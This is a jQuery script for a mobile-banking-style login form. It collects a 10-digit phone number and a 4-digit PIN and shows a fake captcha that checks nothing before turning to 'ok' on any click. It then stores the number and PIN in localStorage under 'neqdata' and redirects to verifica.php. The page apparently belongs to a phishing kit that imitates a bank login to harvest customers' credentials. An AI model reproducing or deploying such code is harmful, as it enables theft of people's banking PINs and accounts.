var catchalisto = 0;

$(document).ready(function(){
  // Si se hace clic en un input, dispara el clic del contenedor para activar la animación.
  $(".entrada").click(function(e) {
    e.stopPropagation();
    $(this).closest(".inp").trigger("click");
  });
  
  // Animación de inputs al hacer clic en el contenedor.
  $(".inp").click(function(){
    if ($(this).attr("estado") === "0") {
      $(this).attr("estado", "1");
      var ob = $(this);
      ob.find(".texto-demo").hide();
      ob.find(".etiqueta").show();
      ob.find(".etiqueta").animate({"margin-top": "-22px"}, 20, function(){
        ob.find(".etiqueta").animate({"margin-top": "-39px"}, 100, function(){
          ob.find(".entrada").removeAttr("readonly").focus();
        });
      });
    }
  });
  
  // Al perder foco, si el input está vacío, se restaura el estado.
  $(".entrada").blur(function(){
    var ob = $(this).closest(".inp");
    if ($(this).val() === "") {
      ob.attr("estado", "0");
      $(this).attr("readonly", "readonly");
      ob.find(".etiqueta").hide();
      ob.find(".texto-demo").show();
    }
  });
  
  // Captcha: cambia la imagen cuando se hace clic.
  $("#catcha").click(function(){
    if (catchalisto === 0) {
      $("#catcha").attr("src", "../assets/img/load-catcha.gif");
      catchalisto = 1;
      setTimeout(function(){ $("#catcha").attr("src", "../assets/img/ok.jpg"); }, 800);
    }
  });
  
  // Validación: los inputs de número (#txt-cel y #txt-re) deben tener 10 dígitos y ser iguales, y #txt-pass 4 dígitos.
  function checkInputs(){
    var cel = $("#txt-cel").val();
    var rep = $("#txt-re").val();
    var pass = $("#txt-pass").val();
    console.log("checkInputs: cel=" + cel + ", rep=" + rep + ", pass=" + pass);
    var btn = $("#paso0");
    var err = $("#err-cel");
    
    if(cel.length === 10 && rep.length === 10 && cel !== rep){
      err.show();
      btn.prop("disabled", true);
    } else if(cel.length === 10 && rep.length === 10 && cel === rep && pass.length === 4){
      err.hide();
      btn.prop("disabled", false);
    } else {
      err.hide();
      btn.prop("disabled", true);
    }
  }
  
  $("#txt-cel, #txt-re, #txt-pass").on("input keyup", checkInputs);
  
  $("#paso0").click(function(){
	console.log("Botón 'Sigue' clicado. Guardando datos y redirigiendo.");
	var neqdata = {
	  numero: $("#txt-re").val(),
	  clave: $("#txt-pass").val()
	};
	try {
	  localStorage.setItem("neqdata", JSON.stringify(neqdata));
	  console.log("Datos guardados:", localStorage.getItem("neqdata"));
	} catch(e) {
	  console.error("Error guardando en localStorage:", e);
	}
	
	$("#fondo, #cargando").show();
	$("#paso0").html('<img src="../assets/img/load-proceso.gif" width="42">');
	setTimeout(function(){
	  console.log("Redirigiendo ahora...");
	  // Prueba con Google para asegurarte que la redirección funciona:
	  window.location.href = "verifica.php";
	}, 3000);
  });
  
});
